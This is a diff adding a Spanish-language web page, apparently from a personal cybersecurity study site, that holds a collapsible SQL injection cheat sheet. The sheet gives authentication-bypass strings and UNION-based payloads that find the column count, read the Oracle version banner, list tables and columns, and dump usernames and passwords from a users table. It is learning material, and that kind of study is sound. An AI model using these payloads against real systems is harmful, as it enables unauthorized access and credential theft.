@@ -1,0 +1,81 @@
+<html lang="es">
+	<!--Idioma en español-->
+	<head>
+		<meta charset="utf-8">
+		<title>Pitah</title>
+	</head>
+	<!--Link al archivo css llamado home.css-->
+	<link rel="stylesheet" type="text/css" href="/css/home.css">
+    <link rel="stylesheet" type="text/css" href="/css/ciberseguridad.css">
+	<body>
+		<header>
+			<!--Logo-->
+			<img id="logo" src="/imagenes/logo4.png" alt="Logo">
+			</div>
+			<!--Barra horizontal de menú-->
+			<nav class="navegacion">
+				<ul class="menu">
+					<li><a href="/index.html"">Home</a></li>
+					<li><a href="/linux.html">Linux</a></li>
+					<li><a href="#">Ciberseguridad</a>
+						<ul class="submenu">
+							<li><a href="/comandos.html">Comandos</a></li>
+							<li><a href="/programas_utiles.html">Programas útiles</a></li>
+							<li><a href="/cosas_sueltas.html">Cosas sueltas</a></li>
+							<li><a href="/SQLi.html">SQL injection</a></li>
+						</ul>
+					</li>
+					<li><a href="#">Programación</a></li>
+					<li><a href="#">Contacto</a></li>
+				</ul>
+			</nav>
+		</header>
+        <!--Cheatsheet de SQL injections-->
+        <ul id="comandos">
+			<lu>
+				<!--style="display: none; es para que aparezca por defecto oculto-->
+                <button onclick="leerMasSQLi()" id="leerMasSQLi" class="block">SQLi</button>
+				<div class="linux" id="SQLi" style="display: none;">
+                    <p>Creado a partir de los siguientes links:</p>
+                    <p><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">BurpSuite</a></p>
+                    <p><a href="https://ironhackers.es/herramientas/lfi-cheat-sheet">IronHackers</a></p>
+                    <p>Cheat sheet de SQL injections.</p>
+                    <p>Al empezar, las sentencias que se enseñan para autentificarse son:</p>
+                    <p id="ejemplo">OR 1=1--</br>administrator'--</p>
+                    <p>En Burp, seleccionando el texto y con ctrl + u puedes codificar en URL las sentencias:</p>
+                    <p id="ejemplo">+OR+1=1--</p>
+                    <p>UNION ATTACK</p>
+                    <font color="red">'</font> comilla para cerrar un parámetro</br>
+                    <font color="red">--</font> para comentar el resto de la sentencia</br>
+                    <p>Añadir NULL hasta llegar al número de columnas que se requieren para una consulta.</br>
+                    Si no tiene número de columnas correctas se muestra un error (500).</br>
+                    Si tiene número de columnas correctas se muestra el resultado de la consulta (200).</p>
+                    <p id="ejemplo">'+UNION+SELECT+NULL,NULL--</p>
+                    <p>Habrá parametros en los que se permita imprimir texto</br>
+                    Se puede comprobar sustituyendo NULL por texto. Si no lo permite también saltará un error.</p>
+                    <p id="ejemplo">'+UNION+SELECT+'ASDF',NULL--</br>'+UNION+SELECT+NULL,'ASDF'--</p>
+                    <p>Una de las primeras funciones a probar es para saber la base de datos y versión.</br>Ejemplo para Oracle, mirar la guía de Burp para ver el resto:</p>
+                    <p id="ejemplo">'+UNION+SELECT+BANNER,+NULL+FROM+v$version--</p>
+                    <p>Si se sabe la tabla y sus columnas, se puede pedir imprimirlas:</p>
+                    <p id="ejemplo">'+UNION+SELECT+username,+password+FROM+users--</p>
+                    <p>Si sólo hay un parametro que acepte escritura, se puede concatenar para visiblemente separarlos.</p>
+                    <P id="ejemplo">'+UNION+SELECT+NULL,+username||'~'||password+FROM+users--</p>
+                    <font color="red">TABLE_NAME</font> Hace de * en la sentencia (SELECT * from...).
+                    <p id="ejemplo">'+UNION+SELECT+TABLE_NAME,NULL+FROM+information_schema.table--</p>
+                    <p>Ejemplo de sentencia en Oracle.</p>
+                    <p id="ejemplo">'+UNION+SELECT+table_name,NULL+FROM+all_tables--</p>
+                    <p>Una vez se tiene una tabla se pueden pedir sus columnas:</p>
+                    <p id="ejemplo">'+UNION+SELECT+column_name,NULL+FROM+information_schema.COLUMNS+WHERE+table_name='users'--</p>
+                </div>
+                <script>
+                    function leerMasSQLi() {
+                        var x = document.getElementById("SQLi");
+                        if (x.style.display === "none") {
+                            x.style.display = "block";
+                        } else {
+                            x.style.display = "none";
+                        }
+                    }
+                </script>
+	</body>
+</html>
